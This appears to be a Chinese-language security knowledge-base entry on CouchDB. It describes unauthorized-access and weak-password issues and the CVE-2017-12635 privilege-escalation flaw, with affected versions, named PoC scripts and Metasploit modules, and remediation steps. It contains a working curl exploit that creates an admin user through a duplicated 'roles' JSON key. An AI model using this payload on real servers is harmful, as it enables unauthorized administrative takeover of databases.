# couchdb
默认使用5984端口。如使用ssl协议，则监听6984端口。CouchDb是一个存储Json文档的数据库。CouchDB是一个完全包含Web的数据库。使用JSON文档存储数据。使用Web浏览器通过HTTP访问您的文档。
## couchdb未授权访问漏洞&弱口令漏洞
### 漏洞说明
HTTP Server默认开启时没有进行验证，而且绑定在0.0.0.0，所有用户均可通过API访问导致未授权访问。在官方配置文档中对HTTP Server的配置有WWW-Authenticate：Set this option to trigger basic-auth popup on unauthorized requests，但是很多用户都没有这么配置，导致漏洞产生。
### 涉及范围
全版本
### 验证方法
验证脚本: poc_couchdb_unauth.py
msfconsole:auxiliary/scanner/couchdb/couchdb_login
浏览器: `http://host:port/_config/` `http://host:port/_utils/`

### 利用方法
msfconsole:exploit/linux/couchdb/couchdb_unauth_exec
pocsuite: poc_couchdb_unauth.py --attack
other: 一键利用

### 修复方式
1. 指定CouchDB绑定的IP （需要重启CouchDB才能生效）在 /etc/couchdb/local.ini 文件中找到 `bind_address = 0.0.0.0`，把 0.0.0.0 修改为 127.0.0.1 ，然后保存.(修改后只有本机才能访问CouchDB)
2. 设置访问密码（需要重启CouchDB才能生效）在 /etc/couchdb/local.ini 中找到`[admins]`字段配置密码。
3. 设置WWW-Authenticate，强制认证。

## couchdb垂直越权漏洞 CVE-2017-12635
### 漏洞说明
CVE-2017-12635是由于Erlang和JavaScript对JSON解析方式的不同，导致语句执行产生差异性导致的。可以被利用于，非管理员用户赋予自身管理员身份权限。
### 涉及范围
小于 1.7.0 以及 小于 2.1.1
### 验证方法
验证脚本: poc_couchdb_outrange.py
手工验证: 见利用方法bash

### 利用方法
```bash
# 新建用户
curl -X PUT -d '{"type":"user","name":"oops","roles":["_admin"],"roles":[],"password":"123456"}' http://host:port/_users/org.couchdb.user:oops -H "Content-Type:application/json"
# 访问http://host:port/_utils/ 使用oops:123456即可登录
```

### 修复方式
1. 所有用户都应升级到CouchDB 1.7.1或 2.1.1。
2. 配置HTTP API配置参数，针对敏感配置信息加入黑名单。